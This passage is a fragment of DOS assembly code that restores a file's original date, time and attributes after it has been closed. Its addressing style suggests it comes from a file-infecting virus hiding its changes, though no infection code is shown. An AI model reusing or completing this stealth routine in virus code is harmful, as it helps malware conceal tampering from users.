 close:         mov    ax,5701h                 ; Restore orig date and time
                mov    cx,[bp+time]
                mov    dx,[bp+date]
                int    21h

                call   close_file

                mov    ax,4301h                 ; Restore file attributes
                mov    cx,[bp+attribs]
                lea    dx,[bp+dta+1eh]
